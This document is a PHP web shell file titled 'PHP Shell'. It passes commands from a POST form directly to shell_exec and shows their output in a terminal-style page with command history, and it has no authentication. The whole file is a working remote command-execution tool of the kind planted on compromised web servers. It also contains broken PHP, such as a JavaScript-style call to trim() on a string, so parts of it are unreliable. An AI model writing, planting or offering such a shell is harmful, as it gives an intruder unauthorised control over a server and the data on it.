<?php if (isset($_POST['form_submitted'])):
        try {
            chdir($_POST['cwd']); //change directory based on what ajax request is at

            //checking if the comand is not an empty cat, so that it does not freeze the code
            //while it waits for input
            if (isset($_POST['command']) && $_POST['command'].trim() != "cat") {
                //check if the command is a cd, because cd has to be executed by a chdir, instead of a shell command
                if (substr($_POST['command'].trim(),0,2) == 'cd') {
                    chdir($_POST['cwd'] . '/' . substr($_POST['command'].trim(),3));
                //else just executes the command on a shell
                } else {
                    $output = shell_exec($_POST['command'] . ' 2>&1'); //2>&1 to redirect stderr to stdout
                }
            }

            $json->whoami = substr(shell_exec('whoami'),0,-1);
            $json->cwd = getcwd();
            $json->output = $output == null ? "" : $output;
        }
        catch (Exception $e) {
            $json->whoami = substr(shell_exec('whoami'),0,-1);
            $json->cwd = getcwd();
            $json->output = $output == null ? "" : $output;
        }
    
        echo json_encode($json);
else: ?>

<html>
<head>
    <title>PHP Shell</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

</head>
<body>
    <form action="phpshell.php" method="POST">
        <div id="terminal"></div>
        <span id='_cwd'><?php echo substr(shell_exec('whoami'),0,-1) . ':' . getcwd(); ?></span>$<input type="text" style="width:800px;" id="command" name="command" autofocus="autofocus" onkeydown="keydown(this,event)">

        <?php echo '<input type="hidden" id="cwd" name="cwd" autocomplete="off" value="' . getcwd() . '"/>'; ?>

        <input type="hidden" name="form_submitted" value="1" />

        <input type="submit" value="Submit">

    </form>

    <script type="text/javascript">
        var commands = [];
        var index = 0;

        //implementation of up and down keypress to navigate through command history
        function keydown(obj,e){
            if (e.keyCode == 38) {
                if (index > 0) {
                    index--;
                    obj.value = commands[index];   
                }
            } else if (e.keyCode == 40){
                if (index < commands.length - 1){
                    index++;
                    obj.value = commands[index];                      
                } else if (index == commands.length - 1 && commands[index] == obj.value)
                    obj.value = '';   

            }
        }

        document.forms[0].addEventListener('submit', function(evt) {
            commands.push(document.getElementById("command").value);
            index = commands.length;

            var request = new XMLHttpRequest();
            request.open('POST', 'phpshell.php', true);
            request.setRequestHeader('accept', 'application/json');

            evt.preventDefault();

            var formData = new FormData(document.forms[0]);

            request.send(formData);

            request.onreadystatechange = function () {
                if (request.readyState === 4) {
                    if (request.status == 200){
                        var response = JSON.parse(request.response)
                        
                        document.getElementById("_cwd").innerText = response.whoami + ':' +response.cwd;
                        document.getElementById("cwd").value = response.cwd; 
                       
                        var pre = document.createElement("pre");
                        pre.innerHTML = response.whoami + ':' + response.cwd + "$ " + 
                        document.getElementById("command").value + '\n' + response.output;

                        document.getElementById("terminal").appendChild(pre);

                        document.getElementById("command").value = "";

                        var elem = document.body;
                        elem.scrollTop = elem.scrollHeight; //keeps textbox visible after command execution
                    }
                }
            }
        });
    </script>
</body> 
</html>
<?php endif; ?> 